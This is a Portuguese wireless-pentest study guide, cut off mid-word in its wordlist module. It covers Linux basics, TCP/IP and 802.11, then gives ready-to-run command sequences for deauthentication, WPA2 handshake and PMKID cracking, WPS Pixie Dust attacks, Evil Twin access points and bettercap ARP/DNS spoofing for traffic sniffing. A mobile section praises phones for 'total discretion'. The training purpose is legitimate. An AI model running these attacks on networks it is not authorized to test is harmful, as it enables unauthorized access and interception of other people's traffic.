# MATERIAL DE ESTUDO PREMIUM - SEGURANÇA WIRELESS
## Do Zero ao Raciocínio de Pentest
### Versão Completa - Sem Filtros

---

## REGRAS DE OURO

- **Escopo primeiro:** só pratique em rede própria, laboratório isolado ou ambiente autorizado por escrito.
- **Entenda antes de executar:** saiba o que cada ferramenta tenta provar e qual evidência gera.
- **Relatório manda no jogo:** pentest sem documentação vira bagunça.
- **Defesa é o fechamento:** cada técnica estudada termina com mitigação e detecção.

---

## MAPA DE ESTUDO

| Fase | O que dominar | Entrega esperada |
|------|---------------|------------------|
| 1. Base Linux | Terminal, arquivos, permissões, comandos | Se mover no Kali sem se perder |
| 2. Rede TCP/IP | IP, MAC, DNS, DHCP, gateway, portas | Ler uma rede como um mapa |
| 3. Wireless 802.11 | Canais, sinal, modos de placa, handshake | Entender o que acontece no ar |
| 4. Ferramentas | Função, evidência, limitação | Saber quando usar cada uma |
| 5. Técnicas | Ataques como hipóteses de teste | Traduzir técnica em risco e correção |
| 6. Relatório | Checklist, escopo, vulnerabilidades | Relatório profissional |

---

# MÓDULO 1: LINUX PARA PENTEST

## O que é o Linux?

Linux é um sistema operacional. O Kali Linux é uma versão especial que já vem com ferramentas de segurança instaladas.

## O Terminal

É onde você digita comandos em vez de clicar em ícones.

## Comandos Essenciais

```bash
# QUEM SOU EU?
whoami

# ONDE ESTOU?
pwd

# O QUE TEM AQUI?
ls              # Lista arquivos
ls -la          # Detalhes + ocultos
ls -lah         # Tamanho legível

# IR PARA OUTRO LUGAR
cd Desktop      # Entra na pasta
cd ..           # Volta uma pasta
cd ~            # Volta para /home/kali
cd -            # Volta para pasta anterior

# CRIAR PASTA
mkdir pentest
mkdir -p pasta1/pasta2/pasta3

# CRIAR ARQUIVO VAZIO
touch notas.txt

# VER CONTEÚDO
cat notas.txt
cat -n notas.txt

# ESCREVER/ADICIONAR
echo "texto" > notas.txt      # Cria ou sobrescreve
echo "texto" >> notas.txt     # Adiciona ao final

# COPIAR
cp arquivo.txt destino/
cp -r pasta1 pasta2

# MOVER/RENOMEAR
mv arquivo.txt novo_nome.txt

# DELETAR (CUIDADO!)
rm notas.txt
rm -rf pasta/

# EDITAR
nano notas.txt
# Ctrl+O = salvar | Ctrl+X = sair

# PROCURAR TEXTO
grep "senha" notas.txt
grep -i "Senha" notas.txt
grep -r "senha" /caminho/
grep -n "senha" notas.txt

# PERMISSÕES
chmod +x script.sh
chmod 700 script.sh
chmod 777 script.sh  # Inseguro!

# INSTALAR
sudo apt update && sudo apt upgrade
sudo apt install nomedoprograma
```

## Redirecionamentos

```bash
# >  : salva em arquivo (sobrescreve)
ls > listagem.txt

# >> : adiciona ao final
echo "linha" >> listagem.txt

# |  : pipe - passa saída para outro comando
ls | grep txt
ps aux | grep chrome
```

## Atalhos

| Atalho | Função |
|--------|--------|
| Tab | Auto-completa |
| Ctrl+C | Para comando |
| Ctrl+D | Sai do terminal |
| Ctrl+L | Limpa tela |
| Ctrl+A | Início da linha |
| Ctrl+E | Final da linha |
| Seta ↑ | Último comando |
| Ctrl+R | Pesquisar histórico |

---

# MÓDULO 2: REDES TCP/IP

## Conceitos

- **IP:** Endereço lógico (192.168.1.100)
- **MAC:** Endereço físico único da placa (00:1A:2B:3C:4D:5E)
- **Gateway:** Roteador que dá acesso à internet
- **Máscara:** Tamanho da rede (/24 = 254 hosts)
- **DNS:** Traduz nomes (google.com) para IPs

## Comandos

```bash
ip a                      # Ver IP
ip route                  # Ver gateway (default via 192.168.1.1)
arp -a / ip neigh         # Tabela ARP (IP x MAC)
cat /etc/resolv.conf      # Ver DNS
ping -c 4 8.8.8.8         # Testar conexão
traceroute google.com     # Ver caminho até o destino
nslookup google.com       # Consultar DNS
sudo dhclient -r          # Liberar IP
sudo dhclient             # Pegar IP novo
```

## Portas Comuns

21 FTP | 22 SSH | 23 Telnet | 25 SMTP | 53 DNS | 80 HTTP | 443 HTTPS | 445 SMB | 3306 MySQL | 3389 RDP

## TCP vs UDP

TCP: confiável, confirma entrega. UDP: rápido, sem confirmação.

---

# MÓDULO 3: WI-FI 802.11

## Frequências

2.4 GHz: maior alcance, menor velocidade, mais interferência
5 GHz: menor alcance, maior velocidade, menos interferência

Canais 2.4 GHz sem sobreposição: 1, 6, 11

## dBm (força do sinal)

-30 a -50: excelente | -60: bom | -70: razoável | -80: fraco | -90: muito fraco

## Modos de Placa

- **Managed:** normal, cliente conectado ao roteador
- **Monitor:** detetive, escuta tudo no ar

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0   # Cria wlan0mon
iwconfig                      # Verificar
sudo airmon-ng stop wlan0mon
```

## Tipos de Segurança

WEP: péssima (minutos) | WPA: fraca (dicionário) | WPA2: boa (dicionário/PMKID/WPS) | WPA3: muito boa (Dragonblood/downgrade)

## Handshake

Aperto de mão de 4 passos. Capture e teste senhas offline.

## WPS

PIN 8 dígitos em 2 partes (4+4). 11 mil tentativas contra 100 milhões. Pixie Dust: segundos.

---

# MÓDULO 4: FERRAMENTAS

## aircrack-ng Suite

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
aircrack-ng captura-01.cap   # Verificar handshake
besside-ng wlan0mon           # Modo automático
```

## bettercap

```bash
sudo bettercap
# Comandos internos:
net.show       # Dispositivos na rede
net.sniff on   # Farejar tráfego
arp.spoof on   # ARP Spoofing
wifi.ap on     # AP falso
dns.spoof on   # DNS Spoofing
```

## hashcat

```bash
cap2hccapx captura.cap captura.hccapx
hashcat -m 2500 captura.hccapx wordlist.txt         # WPA/WPA2
hashcat -m 22000 hash.hc22000 wordlist.txt          # PMKID/WPA3
hashcat -m 2500 captura.hccapx wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

## PMKID Attack

```bash
sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 captura.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt
```

## WPS Attack

```bash
wash -i wlan0mon
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv   # Pixie Dust
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv        # PIN normal
sudo bully -b AA:BB:CC:DD:EE:FF wlan0mon                 # Alternativa
```

---

# MÓDULO 5: ATAQUES

## WPA2 Handshake + Dicionário

1. `sudo airmon-ng check kill && sudo airmon-ng start wlan0`
2. `sudo airodump-ng wlan0mon` - anote BSSID, canal, ESSID
3. `sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon`
4. Outro terminal: `sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon`
5. Quando aparecer "WPA handshake", Ctrl+C
6. `aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap`

## PMKID (sem cliente)

```bash
sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 captura.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt
```

## Evil Twin

Bettercap: `sudo bettercap -eval "set wifi.ap.ssid Rede; wifi.ap on"`
Manual: `sudo airbase-ng -e "Rede" -c 6 wlan0mon` + configurar DHCP

## WPA Enterprise

`sudo apt install hostapd-wpe` + configurar + executar

## Pós-Exploração (MITM)

```bash
sudo bettercap -eval "set arp.spoof.targets IP; arp.spoof on; net.sniff on"
sudo tcpdump -i wlan0mon port 80 -A
```

---

# MÓDULO 6: ATAQUE VIA MOBILE (ANDROID)

## SIM! É Possível!

Requisitos: Android com root, chipset compatível, Kali NetHunter.

## Kali NetHunter

Versão do Kali para Android. Mesmos comandos.

Instalação: root + app NetHunter + chroot Kali + comando `nethunter`

Dentro: `airmon-ng`, `airodump-ng`, `aireplay-ng` - tudo funciona.

## Apps sem NetHunter

zANTI (MITM/SSL strip) | WPSApp (WPS/Pixie Dust) | Bettercap mobile | DroidSheep

## Termux (sem root)

Comandos básicos e scripts, MAS sem modo monitor.

## Vantagens Mobile

1. Discrição total (celular comum)
2. Portabilidade (cabe no bolso)
3. Bateria própria
4. Câmera para evidências
5. 4G/5G para acesso remoto

---

# MÓDULO 7: WORDLISTS

## O que são?

Arquivos com uma senha por linha.

Principal: `/usr/share/wordlists/rockyou.txt`
Descompact
